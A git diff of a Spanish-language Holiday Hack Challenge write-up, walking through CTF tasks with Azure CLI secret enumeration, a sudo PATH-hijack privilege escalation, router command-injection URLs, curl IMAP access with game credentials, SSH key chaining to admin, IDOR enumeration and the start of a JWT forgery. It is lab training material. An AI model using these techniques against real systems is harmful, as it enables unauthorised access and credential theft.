@@ -30,8 +30,6 @@ Empiezo probando una request desde el cliente de prueba.
 
 Primera request de prueba:
 
-imagen
-
 Observo la response.
 
 Me guío con la información obtenida en la primera respuesta y ajusto la consulta.
@@ -107,8 +105,6 @@ Host: <mismo_host>
 User-Agent: id=1
 ```
 
-### evidencia:
-
 ![HTTP GET resuelto](image2.png)
 
 ### Resultado
@@ -125,7 +121,7 @@ Ordenar correctamente los mensajes del TLS Handshake
 
 ### Procedimiento
 
-![Inicio TLS](image copy.png)
+![Inicio TLS](image%20copy.png)
 
 Empiezo el challenge y veo que tengo un par de errores que el juego los marca
 
@@ -143,10 +139,8 @@ Flujo correcto del handshake:
 - Key Exchange
 - Finished
 
-### evidencia:
-
-![TLS Resuelto](image copy 2.png)
-![Success](image copy 3.png)
+![TLS Resuelto](image%20copy%202.png)
+![Success](image%20copy%203.png)
 
 ### Resultado
 
@@ -176,10 +170,9 @@ Host: <mismo_host>
 User-Agent: id=1
 ```
 
-### evidencia:
 
-![HTTPS Resuelto](image copy 4.png)
-![HTTPS Resuelto](image copy 5.png)
+![HTTPS Resuelto](image%20copy%204.png)
+![HTTPS Resuelto](image%20copy%205.png)
 
 ### Resultado
 
@@ -194,7 +187,7 @@ Explorar recursos en Azure y encontrar informacion sensible en una storage accou
 
 ### Procedimiento
 
-Imagen
+![TerminalAzure](image%20copy%206.png)
 
 Para continuar hablo con el ganzo Barry  
 me comenta sobre Azure  
@@ -215,6 +208,7 @@ Busco cuentas de storage dentro del resource group
 ```bash
 az storage account list --resource-group rg-the-neighborhood -o table
 ```
+![ComandoEjecutado](image%20copy%207.png)
 
 Personalizo los comandos con el nombre encontrado anteriormente:
 neighborhoodhoa
@@ -224,6 +218,7 @@ Intento listar contenedores
 ```bash
 az storage container list --account-name neighborhoodhoa
 ```
+![ComandoEjecutado](image%20copy%208.png)
 
 Me devuelve error de permisos  
 Reviso y agrego modo de autenticacion
@@ -232,11 +227,16 @@ Reviso y agrego modo de autenticacion
 az storage container list --account-name neighborhoodhoa --auth-mode login
 ```
 
+![ComandoEjecutado](image%20copy%209.png)
+
+
 Ahora intento listar los blobs
 
 ```bash
 az storage blob list --account-name neighborhoodhoa --container-name public --auth-mode login
 ```
+
+![ComandoEjecutado](image%20copy%2010.png)
 
 No devuelve lo esperado  
 Reviso nuevamente y pruebo con el contenedor que habia visto antes llamado '$web'
@@ -244,6 +244,7 @@ Reviso nuevamente y pruebo con el contenedor que habia visto antes llamado '$web
 ```bash
 az storage blob list --account-name neighborhoodhoa --container-name '$web' --auth-mode login
 ```
+![ComandoEjecutado](image%20copy%2011.png)
 
 Esto devuelve el listado de archivos  
 
@@ -252,6 +253,13 @@ terraform.tfvars
 Aparece un warning de "leaked secrets"
 
 Decido descargar su contenido
+https://learn.microsoft.com/en-us/cli/azure/storage/blob?view=azure-cli-latest
+
+Al comando encontrado en la documentacion le agrego: 
+- nombre de la account que vengo usando
+- container que tiene los files
+- nombre del file que quiero analizar
+
 
 ```bash
 az storage blob download \
@@ -264,10 +272,9 @@ az storage blob download \
 
 Esto muestra el contenido directamente en consola
 
-### evidencia:
 
-imagen del listado de blobs  
-imagen del terraform.tfvars con leaked secrets  
+![Success](image%20copy%2012.png)
+![Success](image%20copy%2013.png)
 
 ### Resultado
 
@@ -282,31 +289,28 @@ Encontrar credenciales expuestas en una storage account con acceso publico
 
 ### Procedimiento
 
-Imagen
-
-Para continuar me dirijo a hablar con Grace  
-cliqueo la consola mas proxima a ella  
-comienza el desafio Storage Secrets
-
 Empiezo ejecutando ayuda para conocer comandos
 
 ```bash
 az help | less
 ```
+![help](image%20copy%2014.png)
 
-Importante usar | less para poder scrollear en la terminal
+- Importante usar | less para poder scrollear en la terminal
 
 Listo las cuentas disponibles
 
 ```bash
 az account list | less
 ```
+![accounts](image%20copy%2015.png)
 
 Luego pruebo listar storage accounts
 
 ```bash
 az storage account list | less
 ```
+![accounts](image%20copy%2016.png)
 
 Scrolleo la respuesta buscando algo llamativo o sospechoso  
 
@@ -316,12 +320,14 @@ Decido inspeccionarla
 ```bash
 az storage account show --name neighborhood2 | less
 ```
+![accountsInspect](image%20copy%2017.png)
 
 Ahora necesito listar sus contenedores
 
 ```bash
 az storage container list --account-name neighborhood2
 ```
+![containers](image%20copy%2018.png)
 
 Esto devuelve los contenedores disponibles
 
@@ -330,6 +336,7 @@ Decido inspeccionar el contenedor public
 ```bash
 az storage blob list --account-name neighborhood2 --container-name public
 ```
+![containers](image%20copy%2019.png)
 
 Esto devuelve el contenido del contenedor  
 
@@ -349,16 +356,14 @@ az storage blob download \
 
 Esto muestra el contenido del archivo directamente en consola
 
-### evidencia:
-
-imagen del storage account con public access true  
-imagen del blob list  
-imagen del contenido de admin_credentials.txt  
+![containers](image%20copy%2020.png)
 
 ### Resultado
 
 Se accede al archivo admin_credentials.txt con credenciales expuestas.
 Desafio completado.
+
+
 
 ## Santa’s Tracking Service
 
@@ -366,20 +371,14 @@ Desafio completado.
 Encontrar el puerto correcto en el que esta corriendo el servicio santa_tracker y conectarse a el
 
 ### Procedimiento
-
-Imagen
-
-Para continuar me dirijo a hablar con Yori  
-me muestra una terminal cURL para trabajar  
-comienza el desafio Santa’s Tracking Service
-
-El objetivo es ver que puerto se esta usando en lugar del 8080 y conectarlo
-
+![ss](image%20copy%2021.png)
 Primero ejecuto el comando sugerido para ver que procesos estan escuchando y en que puertos
 
 ```bash
 ss -tlnp
 ```
+
+![ss-tlnp](image%20copy%2022.png)
 
 La terminal muestra los procesos activos  
 Veo que hay un solo proceso escuchando  
@@ -395,10 +394,8 @@ curl localhost:12321
 
 La respuesta confirma que el servicio esta activo y funcionando
 
-### evidencia:
 
-imagen del resultado de ss -tlnp  
-imagen del curl localhost:12321  
+![curl-localhost:12321](image%20copy%2023.png)
 
 ### Resultado
 
@@ -412,13 +409,6 @@ Desafio completado.
 Extraer todos los dominios, IPs, URLs y direcciones de email sospechosas del mail y defangearlos
 
 ### Procedimiento
-
-Imagen
-
-Para continuar me dirijo al City Hall, segundo piso  
-hablo con Ed Skoudis  
-comienza el desafio Fishing – It’s All About Defang
-
 Se muestra el contenido de un mail sospechoso  
 
 El desafio pide extraer:
@@ -459,6 +449,8 @@ Descarto los que pertenecen a la corporacion legitima
 
 Me quedo con:
 
+![email](image%20copy%2024.png)
+
 Dominios:
 
 mail.icicleinnovations.mail  
@@ -495,11 +487,8 @@ s/\./[.]/g; s/@/[@]/g; s/http/hxxp/g; s/:\//[://]/g
 
 Esto convierte todos los indicadores a formato seguro
 
-### evidencia:
 
-imagen del mail original  
-imagen de los extractores  
-imagen de los IOC defangeados  
+![emailCompletado](image%20copy%2025.png)
 
 ### Resultado
 
@@ -515,15 +504,6 @@ Desafio completado.
 Configurar correctamente las reglas del firewall segun las practicas de seguridad indicadas
 
 ### Procedimiento
-
-Imagen
-
-Para continuar entro al hotel  
-voy a la habitacion de maquinas  
-hablo con Chris  
-selecciono la visual firewall  
-comienza el desafio Holiday Firewall Simulator
-
 Se presentan distintas conexiones del firewall para configurar  
 
 Lo que hago es:
@@ -547,10 +527,7 @@ En los otros segmentos reviso:
 
 Voy ajustando las reglas hasta que todas queden correctamente configuradas segun lo indicado
 
-### evidencia:
-
-imagen de la configuracion inicial  
-imagen de las reglas configuradas correctamente  
+![firewall](image%20copy%2026.png)
 
 ### Resultado
 
@@ -565,15 +542,6 @@ Desafio completado.
 Inspeccionar las Network Security Groups (NSG) y detectar una regla sospechosa
 
 ### Procedimiento
-
-Imagen
-
-Salgo del hotel  
-voy a la parte de atras  
-hablo con el ganzo Lucas  
-toco la terminal a su lado  
-comienza el desafio The Open Door
-
 Primero me pide ejecutar:
 
 ```bash
@@ -581,21 +549,17 @@ az group list
 ```
 
 La respuesta devuelve un JSON  
-Para verlo mas claro ejecuto:
+Para verlo mas claro en una tabla ejecuto:
 
 ```bash
-az group list
+az group list -o table
 ```
-
-Imagen del output en tabla
 
 Luego me pide listar las networks:
 
 ```bash
 az network nsg list -o table
 ```
-
-Imagen del listado de NSG
 
 Para inspeccionar una en particular ejecuto:
 
@@ -611,23 +575,26 @@ Ahora quiero listar las reglas:
 az network nsg rule list --nsg-name nsg-mgmt-eastus --resource-group theneighborhood-rg2 -o table
 ```
 
-Imagen del listado de reglas
+![listadoReglas](image%20copy%2027.png)
 
 Tambien reviso las default security rules permitidas:
 
 ```bash
 az network nsg show --name nsg-web-eastus --resource-group theneighborhood-rg1 --query "defaultSecurityRules[?access=='Allow']" -o table
 ```
+![listadoReglas](image%20copy%2028.png)
 
 ```bash
 az network nsg show --name nsg-mgmt-eastus --resource-group theneighborhood-rg2 --query "defaultSecurityRules[?access=='Allow']" -o table
 ```
+![listadoReglas](image%20copy%2029.png)
 
 Luego vuelvo a listar reglas completas:
 
 ```bash
 az network nsg rule list -g theneighborhood-rg2 --nsg-name nsg-mgmt-eastus
 ```
+![listadoReglas](image%20copy%2030.png)
 
 Empiezo a analizar:
 
@@ -646,7 +613,7 @@ La inspecciono directamente:
 az network nsg rule show -g theneighborhood-rg2 --nsg-name nsg-mgmt-eastus -n Allow-AD-Identity-Outbound
 ```
 
-Imagen del detalle de la regla
+![listadoReglas](image%20copy%2031.png)
 
 ### Resultado
 
@@ -661,14 +628,13 @@ Realizar escaneos con nmap para identificar puertos abiertos y servicios activos
 
 ### Procedimiento
 
-Imagen
+![nmap](image%20copy%2032.png)
 
-Para continuar me dirijo al estacionamiento del hotel  
-interactuo con Eric  
-selecciono su moto  
-comienza el desafio Intro to Nmap
+Primero en la terminal aparece el mensaje indicando  ejecutar una hint que devuelve una nota diciendo que cuando se ejecuta sin opciones, nmap realiza un escaneo TCP de los 1000 puertos mas comunes
 
-Primero en la terminal aparece el mensaje indicando que cuando se ejecuta sin opciones, nmap realiza un escaneo TCP de los 1000 puertos mas comunes
+Busco comandos comunes de nmap:
+https://www.recordedfuture.com/threat-intelligence-101/tools-and-techniques/nmap-commands
+https://www.digitalocean.com/community/tutorials/how-to-use-nmap-to-scan-for-open-ports
 
 Me pide escanear la direccion:
 
@@ -680,26 +646,20 @@ Ejecuto:
 nmap 127.0.12.25
 ```
 
-Imagen del resultado inicial
-
 El resultado no es muy especifico  
-Decido hacer un escaneo completo de todos los puertos:
+Decido correr entonces nmap con el parámetro -p- que indica que se ejecute con los puertos abiertos
 
 ```bash
-nmap 127.0.12.25
+nmap 127.0.12.25 -p-
 ```
 
-Imagen del escaneo completo
-
-Luego el desafio pide escanear un rango de direcciones IP
+Luego el desafio pide escanear un rango de direcciones IP, en este caso 20-28
 
 Ejecuto:
 
 ```bash
 nmap 127.0.12.20-28
 ```
-
-Imagen del escaneo de rango
 
 Ahora me dice que nmap puede identificar que servicios corren en cada puerto  
 Pregunta que servicio esta corriendo en el puerto 8080
@@ -710,8 +670,6 @@ Agrego la opcion -sV para detectar versiones:
 nmap 127.0.12.25 -p 8080 -sV
 ```
 
-Imagen mostrando el servicio en 8080
-
 Luego indica que puedo usar ncat para interactuar con un puerto especifico  
 Debo conectarme al puerto 24601 en la direccion 127.0.12.25
 
@@ -721,7 +679,7 @@ Ejecuto:
 ncat 127.0.12.25 24601
 ```
 
-Imagen mostrando la conexion exitosa
+![nmap](image%20copy%2033.png)
 
 ### Resultado
 
@@ -737,22 +695,24 @@ Identificar que suscripcion tiene un rol Owner asignado mediante PIM y analizar 
 
 ### Procedimiento
 
-Imagen
-
-Para continuar me dirijo al parque  
-interactuo con el ganzo James  
-selecciono la terminal cercana a el  
-comienza el desafio The Owner
-
 Primero me pide ejecutar:
 
 ```bash
 az account list --query "[].name"
 ```
+- [] itera sobre los elementos de la lista
+- .name trae el campo name de cada elemento
+- El resultado esun array con los nombres de las suscripciones
 
-Esto devuelve un array con los nombres de las suscripciones
-
-Imagen del output con las suscripciones
+Respuesta:
+```bash
+[
+  "theneighborhood-sub",
+  "theneighborhood-sub-2",
+  "theneighborhood-sub-3",
+  "theneighborhood-sub-4"
+]
+```
 
 Luego me indica usar queries mas avanzadas con filtros condicionales  
 
@@ -764,11 +724,32 @@ az account list --query "[?state=='Enabled'].{Name:name, ID:id}"
 
 Esto devuelve las suscripciones habilitadas con su ID correspondiente
 
-Imagen del output con Name e ID
+La respuesta es un listado de cuentas a analizar:
+
+```bash
+[
+  {
+    "ID": "2b0942f3-9bca-484b-a508-abdae2db5e64",
+    "Name": "theneighborhood-sub"
+  },
+  {
+    "ID": "4d9dbf2a-90b4-4d40-a97f-dc51f3c3d46e",
+    "Name": "theneighborhood-sub-2"
+  },
+  {
+    "ID": "065cc24a-077e-40b9-b666-2f4dd9f3a617",
+    "Name": "theneighborhood-sub-3"
+  },
+  {
+    "ID": "681c0111-ca84-47b2-808d-d8be2325b380",
+    "Name": "theneighborhood-sub-4"
+  }
+]
+```
 
 Ahora debo revisar que suscripcion tiene el rol Owner asignado  
 
-Para eso ejecuto el siguiente comando reemplazando el ID por el correspondiente
+Para eso ejecuto el siguiente comando utilizando el ID correspondiente
 
 ```bash
 az role assignment list --scope "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64" --query "[?roleDefinitionName=='Owner']"
@@ -788,10 +769,10 @@ az role assignment list --scope "/subscriptions/065cc24a-077e-40b9-b666-2f4dd9f3
 az role assignment list --scope "/subscriptions/681c0111-ca84-47b2-808d-d8be2325b380" --query "[?roleDefinitionName=='Owner']"
 ```
 
-En el grupo 3 aparece algo interesante  
+En el grupo 3 aparece algo interesante : 
 Indica que el grupo esta habilitado mediante PIM
 
-Imagen mostrando el grupo habilitado por PIM
+![grupo3](image%20copy%2034.png)
 
 Ahora debo investigar la membresia de ese grupo  
 
@@ -809,15 +790,16 @@ Reviso y pruebo usando el principalId encontrado en la respuesta anterior:
 az ad member list --group 6b982f2f-78a0-44a8-b915-79240b2b4796
 ```
 
-Imagen del resultado mostrando que es un grupo anidado
+![grupoAnidado](image%20copy%2035.png)
 
-Ahora ejecuto nuevamente el mismo comando pero con el ID del grupo anidado:
+La respuesta es un grupo anidado, por lo que
+ahora ejecuto nuevamente el mismo comando pero con el ID del grupo anidado:
 
 ```bash
 az ad member list --group 631ebd3f-39f9-4492-a780-aef2aec8c94e
 ```
 
-Imagen mostrando los permanent assignments
+![theOwnerCompleto](image%20copy%2036.png)
 
 ### Resultado
 
@@ -829,34 +811,30 @@ Desafio completado.
 ## Neighborhood Watch Bypass
 
 ### Objetivo
-Escalar privilegios y obtener permisos elevados explotando configuraciones de sudo
+El objetivo es encontrar las restricciones vigentes, conseguir privilegios elevados y restaurar el control explotando configuraciones de sudo
 
 ### Procedimiento
 
-Imagen
-
-Para continuar me dirijo al antiguo datacenter  
-hablo con Kyle el bombero  
-selecciono la alarma de incendios  
-comienza el desafio Neighborhood Watch Bypass
-
-El objetivo es saltear las restricciones vigentes y darle privilegios elevados solo al admin  
+![watchBypass](image%20copy%2037.png)
 
 Primero verifico que permisos sudo tengo disponibles:
 
 ```bash
 sudo -l
 ```
-
-Imagen del output mostrando el script permitido
+![watchBypass](image%20copy%2038.png)
 
 El resultado muestra que puedo ejecutar:
 
 /usr/local/bin/system_status.sh
 
-Ahora quiero inspeccionar ese script  
+Ahora quiero inspeccionar ese script 
 
-Reviso el PATH:
+```bash
+cat /usr/local/bin/system_status.sh
+```
+
+Ahora reviso el PATH:
 
 ```bash
 echo $PATH
@@ -866,7 +844,7 @@ Esto devuelve que tengo acceso a:
 
 /home/chiuser/bin
 
-Imagen mostrando el PATH
+![watchBypass](image%20copy%2039.png)
 
 Listo el contenido del directorio:
 
@@ -874,9 +852,9 @@ Listo el contenido del directorio:
 ls -la /home/chiuser/bin/
 ```
 
-Imagen del listado
+![watchBypass](image%20copy%2040.png)
 
-Veo algo llamativo:
+Veo algo llamativo, este runtoanwer es lo que me va a llevar correr lo que quiero:
 
 runtoanswer -> /etc/firealarm/restore_fire_alarm
 
@@ -908,17 +886,13 @@ Dentro del archivo agrego el comando:
 /etc/firealarm/restore_fire_alarm
 ```
 
-Guardo con Ctrl+O  
-Confirmo nombre  
-Salgo con Ctrl+X  
-
 Ahora le doy permisos de ejecucion:
+
+https://stackoverflow.com/questions/8328481/chmod-777-to-a-folder-and-all-contents
 
 ```bash
 chmod 777 free
 ```
-
-Imagen mostrando permisos asignados
 
 Finalmente ejecuto el script permitido con sudo:
 
@@ -926,21 +900,21 @@ Finalmente ejecuto el script permitido con sudo:
 sudo /usr/local/bin/system_status.sh
 ```
 
-El sistema ejecuta el archivo dentro de free y logra restaurar el archivo necesario
+El sistema ejecuta el comando dentro de free y logra restaurar el control
 
-Imagen mostrando ejecucion exitosa
+![watchBypass](image%20copy%2041.png)
 
 ### Resultado
 
-Se logra escalar privilegios aprovechando el PATH y permisos de sudo.
+Se encontraron las restricciones vigentes, conseguir privilegios elevados y restaurar el control.
 Desafio completado.
 
 
 
 
-
-
 # ACTO II
+
+Para esto acto utilizo una máquina virtual Kali Linux en VirtualBox
 
 ## Dosis Network Down
 
@@ -949,19 +923,9 @@ Encontrar la contraseña del wifi explotando una vulnerabilidad en el router
 
 ### Procedimiento
 
-Imagen
-
-Para este acto utilizo una maquina virtual Kali Linux  
-
-Me dirijo al 24  
-hablo con Januz Jasinski  
-me dice que han cambiado la contraseña del wifi  
-
-Selecciono el router para intentar encontrarla en su configuracion  
-
 Se abre una pagina de login
 
-Imagen del login del router
+![watchBypass](image%20copy%2042.png)
 
 Empiezo probando contraseñas comunes:
 
@@ -969,7 +933,9 @@ password
 password123  
 notpassword  
 
-Luego del tercer intento el sistema indica intentar desde consola  
+Luego del tercer intento el sistema indica intentar desde consola 
+
+![watchBypass](image%20copy%2043.png)
 
 Investigo sobre vulnerabilidades del router segun su version  
 
@@ -1004,7 +970,7 @@ https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?f
 La primera vez devuelve ok  
 La segunda vez devuelve el listado de archivos
 
-Imagen mostrando el listado del sistema
+![watchBypass](image%20copy%2043.png)
 
 Esto confirma que tengo ejecucion remota de comandos  
 
@@ -1025,7 +991,7 @@ https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?f
 La primera vez devuelve ok  
 La segunda vez muestra el contenido del archivo
 
-Imagen mostrando el contenido del wireless config
+![watchBypass](image%20copy%2044.png)
 
 En el archivo encuentro:
 
@@ -1046,4 +1012,645 @@ Desafio completado.
 
 
 
-## RetroRecovery
+## Retro Recovery
+
+### Objetivo
+
+En este reto debo analizar una imagen de un disquete retro para recuperar archivos eliminados
+
+
+## Procedimiento
+
+Intento montar la imagen en Windows, pero el sistema me muestra un mensaje indicando que el archivo está corrupto.
+
+Esto me hace pensar que puede haber información eliminada o estructuras dañadas dentro del sistema de archivos, por lo que decido utilizar una herramienta forense más avanzada.
+
+
+## 2. Análisis con TestDisk
+
+Para analizar la imagen utilizo **TestDisk**, una herramienta incluida en Kali Linux que permite recuperar particiones y archivos eliminados.
+
+Me dirijo al directorio donde se encuentra la imagen y ejecuto:
+
+```bash
+"testdisk ../../Desktop/floppy.img"
+```
+
+Selecciono el archivo `floppy.img` de la lista de medios detectados.
+
+![retro](image%20copy%2071.png)
+
+
+## 3. Tipo de tabla de particiones
+
+TestDisk no detecta automáticamente una tabla válida, por lo que acepto la opción por defecto:
+
+"none"
+
+
+## 4. Sistema de archivos
+
+La herramienta detecta que el sistema de archivos es:
+
+FAT12
+
+Selecciono la partición FAT12 para continuar.
+
+## 5. Listado de archivos
+
+Luego selecciono la opción:
+
+"List"
+
+Esto me muestra el contenido del sistema de archivos, incluyendo archivos eliminados.
+
+Entre los archivos encuentro uno que me llama la atención:
+
+all_i-want_for_christmas.bas
+
+![retro](image%20copy%2072.png)
+
+## 6. Recuperación del archivo
+
+Selecciono el archivo y presiono:
+
+"c"
+
+Para copiarlo.
+
+Elijo el directorio de destino y vuelvo a presionar:
+
+"c"
+
+cuando la operación es exitosa, testDisk me confirma que el archivo fue copiado correctamente.
+
+## 7. Análisis del contenido
+
+Abro el archivo recuperado en un editor de texto.
+
+El contenido corresponde a un programa en BASIC con aproximadamente 570 líneas que describen una simulación relacionada con Star Trek, lo cual coincide con la pista que mencionaba buscar un “tesoro clásico”.
+
+Revisando el archivo, encuentro una cadena codificada en Base64:
+
+bWVycnkgY2hyaXN0bWFzIHRvIGFsbCBhbmQgdG8gYWxsIGEgZ29vZCBuaWdodAo=
+
+![retro](image%20copy%2073.png)
+
+
+## 8. Decodificación
+
+Decido decodificar la cadena en la web utilizando un programa para esto
+
+![retro](image%20copy%2074.png)
+
+El resultado me devuelve el mensaje correspondiente a la bandera del reto.
+
+![retro](image%20copy%2075.png)
+
+## Resultado
+
+Después de recuperar el archivo eliminado y decodificar la cadena en Base64, logro obtener la bandera.
+
+Con esto doy por completado el desafio Retro Recovery.
+
+
+## Mail Detective
+
+### Objetivo
+
+Acceder al servidor IMAP usando curl, revisar los correos en la carpeta Spam y encontrar la URL utilizada en una función maliciosa.
+
+### Procedimiento
+
+Primero debo conectarme al servidor IMAP para obtener un listado de las carpetas disponibles.
+Para esto utilizo curl junto con las credenciales y el puerto que proporciona la consola:
+
+```bash
+curl imap://dosismail:holidaymagic@127.0.0.1
+```
+
+![imap](image%20copy%2047.png)
+
+Las carpetas lucen normales como las de cualquier cliente de correo (Inbox, Spam, etc.), por lo que el siguiente paso es verificar cuántos correos hay en la carpeta Spam.
+Para eso ejecuto:
+
+```bash
+curl imap://dosismail:holidaymagic@127.0.0.1/Spam?*
+```
+
+Esto devuelve que la carpeta Spam contiene 3 mails
+
+Ahora necesito ver el contenido de esos correos.
+Para esto utilizo la carpeta junto con MAILINDEX indicando el número de mail que quiero leer.
+https://everything.curl.dev/usingcurl/reademail.html
+
+Primero intento:
+
+```bash
+curl imap://dosismail:holidaymagic@127.0.0.1/Spam;MAILINDEX=1
+```
+
+No funciona de esa forma, por lo que pruebo agregando comillas:
+
+```bash
+curl "imap://dosismail:holidaymagic@127.0.0.1/Spam;MAILINDEX=1"
+```
+
+Esto devuelve el contenido del primer mail
+En este mail no encuentro la URL asi que paso al siguiente
+
+```bash
+curl "imap://dosismail:holidaymagic@127.0.0.1/Spam;MAILINDEX=2"
+```
+
+![imap](image%20copy%2048.png)
+
+El body del segundo mail no muestra la url en la funcion exfiltrateData()
+var pastebinUrl = "https://frostbin.atnas.mail/api/paste";
+
+![imap](image%20copy%2049.png)
+
+
+Ahora lo que queda es introducirla en el input del desafio
+
+https://frostbin.atnas.mail/api/paste
+
+
+De esta forma completo el desafio
+
+### Resultado
+
+Se logra identificar la URL utilizada para exfiltración de datos dentro del segundo correo de la carpeta Spam.
+Desafío completado.
+
+
+## Quantgnome Leap
+
+
+## Objetivo
+
+Comenzamos como el usuario qgnome. 
+El objetivo es escalar entre usuarios usando las claves SSH hasta llegar a admin, quien tiene acceso a la flag.
+
+
+## Procedimiento
+
+```bash
+pwd
+ls -lah
+```
+![leap](image%20copy%2051.png)
+
+Veo la carpeta .ssh, entonces entro:
+
+```bash
+cd .ssh
+ls -lah
+```
+
+![leap](image%20copy%2052.png)
+
+Encuentro id_rsa e id_rsa.pub.
+Reviso la clave pública:
+
+```bash
+cat id_rsa.pub
+```
+
+![leap](image%20copy%2053.png)
+
+Pertenece a gnome1.
+
+Reviso en qué puerto corre SSH:
+
+```bash
+cat /opt/oqs-ssh/sshd_config
+```
+
+El servicio corre en el puerto 2222.
+
+Me conecto usando la clave privada:
+
+```bash
+ssh gnome1@localhost -p 2222 -i ~/.ssh/id_rsa
+```
+
+![leap](image copy 54.png)
+
+Accedo correctamente como gnome1.
+
+Ya como gnome1:
+
+```bash
+cd ~/.ssh
+ls -lah
+```
+
+![leap](image%20copy%2055.png)
+
+Encuentro id_ed25519 e id_ed25519.pub.
+
+```bash
+cat id_ed25519.pub
+```
+
+```bash
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKUOOPy0e1+4EzuM5PYc1/lfsXrR9FFDxTxDztvCi0Ce gnome2
+```
+
+La clave pertenece a gnome2.
+
+Me conecto:
+
+```bash
+ssh gnome2@localhost -p 2222 -i id_ed25519
+```
+
+![leap](image%20copy%2056.png)
+
+Accedo como gnome2.
+
+```bash
+cd ~/.ssh
+ls -lah
+```
+![leap](image%20copy%2057.png)
+```bash
+cat id_mayo2.pub
+```
+
+La clave es de gnome3.
+
+![leap](image%20copy%2058.png)
+
+```bash
+ssh gnome3@localhost -p 2222 -i id_mayo2
+```
+
+![leap](image%20copy%2059.png)
+
+Accedo correctamente.
+
+```bash
+cd ~/.ssh
+ls -lah
+```
+![leap](image%20copy%2060.png)
+
+```bash
+cat id_ecdsa_nistp256_sphincssha2128fsimple.pub
+```
+
+```bash
+ssh-ecdsa-nistp256-sphincssha2128fsimple AAAAKHNzaC1lY2RzYS1uaXN0cDI1Ni1zcGhpbmNzc2hhMjEyOGZzaW1wbGUAAAAIbmlzdHAyNTYAAABBBL6fN38B6kQNiS0vAvGeGjAJ7Da2YbpBaAXkeeDJ3CJIUZc8PzNWCfzW5qN8z0RnS1/Hia1jRt6dydqeiVHBa9cAAAAgRAPMBt8y/4/YdBEw9OutMv37HJy50gIQfmzUY5d82Bg= gnome4
+```
+
+La clave pertenece a gnome4.
+
+```bash
+ssh gnome4@localhost -p 2222 -i id_ecdsa_nistp256_sphincssha2128fsimple
+```
+
+![leap](image%20copy%2061.png)
+
+Accedo como gnome4.
+
+```bash
+cd ~/.ssh
+ls -lah
+![leap](image%20copy%2062.png)
+```
+
+```bash
+cat id_ecdsa_nistp521_mldsa87.pub
+```
+
+![leap](image%20copy%2063.png)
+
+La clave corresponde a admin.
+
+```bash
+ssh admin@localhost -p 2222 -i id_ecdsa_nistp521_mldsa87
+```
+
+![leap](image%20copy%2064.png)
+
+
+Ahora tengo acceso como admin.
+
+```bash
+cd /opt/oqs-ssh/flag
+ls
+cat flag
+```
+
+Devuelve:
+
+![leap](image%20copy%2065.png)
+
+Ingreso HHC{L3aping_0v3r_Quantum_Crypt0} y completo el desafío.
+
+
+## REsultado
+
+Logré encadenar accesos SSH entre usuarios utilizando las claves privadas encontradas en cada carpeta .ssh. De esta forma llegué al admin, que tiene permisos para acceder a la flag.
+
+
+
+## IDORable Distro
+
+## Objetivo
+
+Encontrar el nombre del gnomo que pidió sushi congelado explotando una posible vulnerabilidad IDOR en el sistema de recibos del restaurante.
+
+
+## Procedimiento
+
+Debo buscar un recibo fuera del restaurante. 
+En el lateral derecho encontramos un código QR.
+
+Al escanearlo obtenemos una URL similar a:
+
+```bash
+https://its-idorable.holidayhackchallenge.com/receipt/i9j0k1l2
+```
+
+La página muestra un recibo en formato web, pero no contiene sushi congelado
+
+![sushi](image%20copy%2066.png)
+
+Para analizar cómo funciona el sistema, configuro BURP como proxy y observo el tráfico HTTP (con intercept desactivado).
+
+![sushi](image%20copy%2067.png)
+![sushi](image%20copy%2068.png)
+En HTTP History veo dos requests importantes:
+
+```bash
+GET /receipt/...
+GET /api/receipt/...
+```
+
+El primero devuelve el HTML.
+El segundo devuelve la información real del recibo en formato JSON.
+
+Me enfoco en:
+
+```bash
+GET /api/receipt/103
+```
+
+El id 103 corresponde al recibo actual.
+
+Para comprobar si existe un IDOR, envío la request a Repeater y modifico el id manualmente:
+
+![sushi](image%20copy%2069.png)
+
+```bash
+GET /api/receipt/102
+GET /api/receipt/101
+```
+
+El servidor devuelve otros recibos válidos, lo que confirma que el identificador es predecible y no hay control de acceso adecuado.
+
+Como los IDs parecen secuenciales, envío la request a Intruder para automatizar pruebas.
+
+![sushi](image%20copy%2070.png)
+
+Configuro un ataque numérico probando IDs desde 101 hasta 150.
+
+Ejecuto el ataque y reviso las respuestas buscando algún recibo que contenga “frozen sushi”.
+
+
+## Resultado
+
+En el id 139 encuentro un recibo que incluye sushi congelado
+
+El nombre asociado al pedido es:
+
+Bartholomew Quibblefrost, ingreso esto y desafío completado.
+
+
+## Going in Reverse
+
+## Objetivo
+
+Entender cómo funciona el sistema de validación en el archivo BASIC y extraer la contraseña y la bandera a partir del código.
+
+
+## Procedimiento
+
+Kevin nos entrega el archivo login.bas. 
+
+Al revisarlo, identifico dos variables importantes:
+
+```bash
+ENC_PASS$ = "D13URKBT"
+ENC_FLAG$ = "DSA|auhts*wkfi=dhjwubtthut+dhhkfis+hnkz"
+```
+
+El programa solicita una contraseña y realiza estas acciones:
+
+1. Verifica que el largo coincida.
+2. Recorre cada carácter.
+3. Aplica XOR 7 al carácter ingresado.
+4. Compara el resultado con el valor almacenado en ENC_PASS$.
+5. Si todo coincide, aplica la misma operación XOR 7 sobre ENC_FLAG$ y la imprime.
+
+Esto indica que tanto la contraseña como la bandera están transformadas usando XOR con clave 7.
+
+Dado que XOR es simétrico, puedo aplicar la misma operación nuevamente para obtener los valores originales.
+
+Para hacerlo más rápido, replico la lógica en Python:
+
+```python
+def transform(text):
+    output = ""
+    for ch in text:
+        output += chr(ord(ch) ^ 7)
+    return output
+
+print(transform("D13URKBT"))
+print(transform("DSA|auhts*wkfi=dhjwubtthut+dhhkfis+hnkz"))
+```
+
+
+## Resultado
+
+El script devuelve:
+```bash
+C64RULES
+CTF{frost-plan:compressors,coolant,oil}
+```
+
+La contraseña real es C64RULES y la bandera es CTF{frost-plan:compressors,coolant,oil}.
+
+Logré identificar el uso de XOR 7 y revertir la operación.
+
+
+## Rogue Gnome Identity Provider
+
+### Objetivo
+
+Escalar privilegios modificando un JWT para acceder al panel administrativo y descubrir el firmware instalado.
+
+
+## 1. Obtener un JWT válido
+
+Usamos las credenciales encontradas en el archivo notes para autenticarnos contra el IdP:
+
+```bash
+curl -X POST --data-binary $'username=gnome&password=SittingOnAShelf&return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth' http://idp.atnascorp/login
+```
+
